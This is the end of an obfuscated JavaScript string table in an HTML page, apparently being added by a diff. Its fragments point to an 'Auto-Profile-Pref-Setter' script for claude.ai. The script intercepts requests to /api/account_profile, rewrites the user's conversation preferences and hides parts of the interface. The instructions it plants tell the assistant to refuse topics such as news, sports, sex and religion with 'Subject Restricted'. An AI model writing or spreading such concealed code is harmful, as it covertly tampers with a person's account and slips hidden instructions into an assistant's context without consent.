jrj','ing.','n,a','isArray','49641WSTtjJ','slice','com','rRNYb','HTHLl','IvPIk','etter]\x20Int','conversati','SuFRO','div[role=\x22','rent\x20profi','ViGBa','ssXpz','7LuXyky','label[for=','closest','referrer','https://cl','bout\x20gossi','EePYf','etter]\x20Pre','N\x20parse\x20fa','etter]\x20Cou','ch\x20profile','qOINy','vgksg','45933WhokLb','error','ercepted\x20X','color:oran','krKMU','KAJXj','thSeY','-Setter]\x20H','display','BSfxS','rts,\x20or\x20en','trimStart','xhTAt','ate\x20alread','719940hFyzqJ','zNpIr','Edit','readyState','ById','etter]\x20Che','ct\x20Restric','4931040TzWAGt','liBlu','CBJOt','updated\x20pr','url','ercept\x20mes','Please\x20fol','ing\x20conver','\x20need\x20to\x20b','gTbKF','mode','UhyrJ','o\x20not\x20matc','wrap\x22],\x20sp','p[class*=\x22','\x20content,\x20','prototype','torAll','extarea\x20in','gVRtS','clone','WTeCA','style','/api/accou','redirect','sjEKQ','REVnq','pMpwX','message','ercepted\x20m','etter]\x20XHR','WjiQf','UpdateAPI','ate\x20profil','cPTTy','URShm',',\x20applying','RuUSr','nitializat','CzNQe','led\x20to\x20upd','member\x20my\x20','ge;font-we','refs.','\x20error:','complete','space-pre-','\x22whitespac','\x20news,\x20spo','qgxUI','aBYXi','lled.','includes','WFCdx','claude.ai','low\x20and\x20re','PyxwZ','e-pre-wrap','hlmam','for\x20unders','245856yRiIDK','anual\x20prof','etter]\x20mes','tertainmen','ayrNm','replace','],\x20div[cla','trim','toUpperCas','n;font-wei','\x20modificat','rds,\x20div.b','\x22conversat','POST','content','startsWith','EMcVJ','ot\x20answer.','ofile\x20pref','or\x20modifyi','dolatry,\x20w','232oUxBKJ','mKNxj','IAKtx','RfkPZ','ating...','cepGr','%c[Auto-Pr','QdYBf','nt_profile','lSCkf','HhkQm','16876413RqvSdK','EUBaC','peVAL','PkvMp','ght:bold','BHGiE','on-prefere','ight:bold','warn','ferences\x20d','e\x20to\x20check','cessfully\x20','profile','IyplI','th:\x20\x22Subje','zIJOZ','parentNode','forEach','rieve\x20curr','iPBpe','HR\x20PUT\x20/ap','trimEnd','log','bTMOW','orship,\x20pu','SfRKp','sired\x20pref',',\x20anything','DyIWE',',\x20intimacy','iding\x20UI.','ng\x20profile','led\x20to\x20fet','quest:','nderwear,\x20','RPePs','cache','aAltT','credential','VLHNL','MzUNW','zgEqV','querySelec','rtility,\x20i','ent','KRqYm','If\x20asked\x20a','Thank\x20you\x20','QmLGZ','humor,\x20cul','h\x20desired\x20','\x20set.','wwCHx',',\x20span.bre','WtykY','\x20desired\x20p','getElement','sation\x20pre','sure\x20prefe','length','uLvRc','3243990YeoIzw','re\x20already','pRVDM','nces','\x20set\x20and\x20h','parse','ction,\x20sex','tor','FDMKH','y\x20in\x20progr','\x20arousing,','etter]\x20int','prompt','JnQgp','an[class*=','RYzct','value.\x20Upd','ile-Pref-S','grQYX','indexOf','.\x20Status:','VRjzh','BadAG','GET','e\x20set...','HDTYJ','etter]\x20Suc','parentElem','tanding.','pKQMA','textConten','etter]\x20Ret','jfMwI','\x20correctly','ion\x20comple',',\x20explicit','or\x20fetchin','PUT','igion\x20do\x20n','WDGFl','ferences\x20a','none','messages','JNCMl','headers','bqaSs','lTwrf','etter]\x20Upd','NZesn','button,spa','references','aMGMB','iled:','ooks\x20insta','respond\x20wi','OnGjn','etter]\x20Fai','e.\x20Status:','reak-words','rences\x20are','\x20update\x20re','qyOOo','open','ukpQn','TuVSG','iCevP','jXtgk','anthropic.','ting\x20to\x20en','or\x20updatin','ationships','\x22],','pplying\x20de','NDrAh','fyfiB','nWBWO','iBqad','-Setter]\x20I','ess,\x20skipp','TYCVm','observe'];_0x2ce5=function(){return _0x153cce;};return _0x2ce5();}</script>
+</body>
+</html>
